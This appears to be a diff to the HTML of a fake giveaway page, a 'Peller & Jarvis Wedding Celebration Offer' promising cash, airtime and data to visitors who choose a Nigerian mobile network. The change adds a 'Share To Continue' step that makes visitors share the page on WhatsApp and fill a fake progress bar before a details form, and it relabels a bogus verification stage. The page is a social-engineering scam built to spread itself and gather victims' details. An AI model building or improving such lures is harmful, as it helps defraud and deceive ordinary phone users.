@@ -7,15 +7,15 @@
   <title>Peller & Jarvis Wedding Celebration Offer</title>
   <meta property="og:title" content="Peller & Jarvis Wedding Celebration Offer" />
   <meta property="og:description" content="Celebrate Peller and Jarvis and register for the wedding reward package." />
-  <meta property="og:image" content="676443C7-1C74-4A8C-AC08-05F20D05E502.png?v=15" />
+  <meta property="og:image" content="676443C7-1C74-4A8C-AC08-05F20D05E502.png?v=16" />
   <link rel="preconnect" href="https://fonts.googleapis.com" />
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
   <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800&display=swap" rel="stylesheet" />
-  <link rel="stylesheet" href="css/style.css?v=15" />
+  <link rel="stylesheet" href="css/style.css?v=16" />
 </head>
 <body>
   <main class="page-shell">
-    <img class="hero" src="676443C7-1C74-4A8C-AC08-05F20D05E502.png?v=15" alt="Peller and Jarvis wedding celebration" />
+    <img class="hero" src="676443C7-1C74-4A8C-AC08-05F20D05E502.png?v=16" alt="Peller and Jarvis wedding celebration" />
     <div class="ticker"><span>PELLER AND JARVIS 2026 WEDDING CELEBRATION OFFER</span></div>
 
     <section id="intro" class="post step-panel">
@@ -23,13 +23,11 @@
         <span>POWERED BY PELLER & JARVIS</span>
         <strong>Wedding Celebration Offer</strong>
       </div>
-
       <div class="reward-banner">
         <div><strong>₦25,000</strong><span>Cash</span></div><b>+</b>
         <div><strong>₦10,000</strong><span>Airtime</span></div><b>+</b>
         <div><strong>20GB</strong><span>Data</span></div>
       </div>
-
       <div class="choice-title">CHOOSE YOUR MOBILE NETWORK</div>
       <div id="networkOptions" class="network-options">
         <button type="button" data-network="MTN"><span>MTN</span><small>₦10,000 + 20GB</small></button>
@@ -37,7 +35,6 @@
         <button type="button" data-network="Glo"><span>Glo</span><small>₦10,000 + 20GB</small></button>
         <button type="button" data-network="9-Mobile"><span>9-Mobile</span><small>₦10,000 + 20GB</small></button>
       </div>
-      <p id="networkError" class="error hidden">Choose a network to continue.</p>
     </section>
 
     <section id="loader" class="post step-panel hidden center-panel">
@@ -55,9 +52,27 @@
     </section>
 
     <section id="checking" class="post step-panel hidden center-panel">
-      <div class="step-header"><span>VERIFYING</span><strong>Checking Your Details</strong></div>
+      <div class="step-header"><span>ACTIVATING</span><strong>Checking Your Details</strong></div>
       <div class="progress-wrap"><div class="progress-track"><i id="verificationFill"></i></div><strong id="verificationPercent">0%</strong></div>
       <div id="verificationMessage" class="verification-message">Starting verification…</div>
+    </section>
+
+    <section id="shareStep" class="post step-panel hidden">
+      <div class="step-header"><span>VERIFICATION</span><strong>Share To Continue</strong></div>
+      <div class="share-message">
+        <strong>Congratulations, <span id="sharePhone">Supporter</span> 🎉</strong>
+        <span>Your reward registration is pending. Complete the sharing stage to continue.</span>
+      </div>
+      <div class="share-instructions">
+        <div><b>1</b><span>Tap SHARE to open WhatsApp.</span></div>
+        <div><b>2</b><span>Return here and complete the sharing progress.</span></div>
+      </div>
+      <button id="shareWhatsapp" class="share-button">SHARE</button>
+      <div class="share-progress">
+        <div class="progress-track"><i id="shareFill"></i></div>
+        <strong id="sharePercent">0%</strong>
+      </div>
+      <button id="continueAfterShare" class="primary hidden">CONTINUE</button>
     </section>
 
     <section id="detailsStep" class="post step-panel hidden">
@@ -96,6 +111,6 @@
       <button id="startOver" class="secondary">START AGAIN</button>
     </section>
   </main>
-  <script src="js/app.js?v=15"></script>
+  <script src="js/app.js?v=16"></script>
 </body>
 </html>
